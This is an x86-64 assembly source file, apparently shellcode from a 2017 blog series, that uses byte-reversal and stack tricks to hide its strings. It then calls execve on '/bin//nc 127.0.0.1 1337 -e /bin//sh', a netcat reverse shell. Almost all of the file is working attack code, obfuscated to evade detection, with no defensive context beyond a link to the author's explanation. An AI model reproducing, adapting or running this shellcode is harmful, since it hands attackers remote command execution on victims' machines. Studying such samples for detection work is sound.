;The MIT License (MIT)

;Copyright (c) 2017 Robert L. Taylor

;Permission is hereby granted, free of charge, to any person obtaining a 
;copy of this software and associated documentation files (the “Software”), 
;to deal in the Software without restriction, including without limitation 
;the rights to use, copy, modify, merge, publish, distribute, sublicense, 
;and/or sell copies of the Software, and to permit persons to whom the 
;Software is furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included 
;in all copies or substantial portions of the Software.

;The Software is provided “as is”, without warranty of any kind, express or
;implied, including but not limited to the warranties of merchantability, 
;fitness for a particular purpose and noninfringement. In no event shall the
;authors or copyright holders be liable for any claim, damages or other 
;liability, whether in an action of contract, tort or otherwise, arising 
;from, out of or in connection with the software or the use or other 
;dealings in the Software.
; For a detailed explanation of this shellcode see my blog post: 
; http://a41l4.blogspot.ca/2017/03/polynetcatrevshell1434.html

global _start 

section .text

_start:
	jmp next
sh:
	db 0x68,0x73,0x2f,0x2f,0x6e,0x69,0x62,0x2f
nc:
	db 0x63,0x6e,0x2f,0x2f,0x6e,0x69,0x62,0x2f
ip:
	db 0x2e,0x30,0x2e,0x30,0x2e,0x37,0x32,0x31
handle:
	pop rcx
	lodsq
	bswap rax
	push rax
	push rsp
	push rcx
	ret
next:
	xor edx,edx
	lea rsi,[rel sh]
	push rdx
	call handle
	pop rbx

	push rdx
	call handle
	pop rdi

	push '1'
	call handle
	pop r12

	push '1337'
	push rsp
	pop rcx

	push rdx
	push word '-e'
	push rsp
	pop rax
	
	push rdx ; push null
	push rbx ; '/bin//sh'
	push rax ; '-e'
	push rcx ; '1337' 
	push r12 ; '127.0.0.1'
	push rdi ; '/bin//nc'
	push rsp
	pop rsi  ; address of array of pointers to strings
	
	; some magic to put 3b (59) into RAX	 
	; note that this depends on the push "-e" 
	; and it's position on the stack
	mov rax,[rsp + 48]
	shr rax,8
	sub rax,0x2a
	syscall

